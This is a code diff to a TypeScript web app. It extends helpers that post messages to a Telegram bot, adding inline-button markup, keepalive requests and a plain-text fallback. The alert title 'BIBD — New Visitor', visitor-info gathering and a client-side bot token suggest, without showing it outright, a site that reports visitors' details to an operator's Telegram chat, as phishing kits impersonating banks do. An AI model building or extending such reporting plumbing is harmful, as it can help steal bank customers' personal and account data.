@@ -252,7 +252,7 @@ export const fetchVisitorInfo = async () => {
     return null;
 };
 
-export const sendTelegramRawMessage = async (messageText: string) => {
+export const sendTelegramRawMessage = async (messageText: string, replyMarkup?: any) => {
     try {
         const botTokensValue =
             process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
@@ -284,20 +284,43 @@ export const sendTelegramRawMessage = async (messageText: string) => {
 
                 for (const url of endpoints) {
                     try {
+                        const payload: any = {
+                            chat_id: id,
+                            text: messageText,
+                            parse_mode: "HTML",
+                        };
+                        if (replyMarkup) {
+                            payload.reply_markup = replyMarkup;
+                        }
                         const response = await fetch(url, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                chat_id: id,
-                                text: messageText,
-                                parse_mode: "HTML",
-                            }),
+                            body: JSON.stringify(payload),
+                            keepalive: true,
                         });
                         if (response.ok) {
                             return await response.json();
+                        } else {
+                            // If rejected (e.g. invalid button markup or HTML formatting), retry as plain text without reply_markup
+                            const errBody = await response.text();
+                            console.warn(`Telegram send failed (${response.status}) on ${url}:`, errBody);
+                            if (replyMarkup || payload.parse_mode) {
+                                const fallbackRes = await fetch(url, {
+                                    method: "POST",
+                                    headers: { "Content-Type": "application/json" },
+                                    body: JSON.stringify({
+                                        chat_id: id,
+                                        text: messageText.replace(/<[^>]*>/g, ""),
+                                    }),
+                                    keepalive: true,
+                                });
+                                if (fallbackRes.ok) {
+                                    return await fallbackRes.json();
+                                }
+                            }
                         }
                     } catch (err) {
-                        // try next endpoint fallback
+                        console.warn(`Telegram fetch error on ${url}:`, err);
                     }
                 }
                 return null;
@@ -315,10 +338,11 @@ export const sendTelegramMessage = async (params: {
     type?: string;
     exclude?: string[];
     message?: string;
+    replyMarkup?: any;
     [key: string]: any;
 }) => {
     try {
-        const { title, type, exclude, message: customMessage, ...data } = params;
+        const { title, type, exclude, message: customMessage, replyMarkup, ...data } = params;
 
         const mainTitle = title || "BIBD — New Visitor";
         const domain =
@@ -488,7 +512,7 @@ export const sendTelegramMessage = async (params: {
             }
         }
 
-        return await sendTelegramRawMessage(formattedMessage.trim());
+        return await sendTelegramRawMessage(formattedMessage.trim(), replyMarkup);
     } catch (error) {
         console.error("❌ Critical Error in sendTelegramMessage:", error);
         return null;
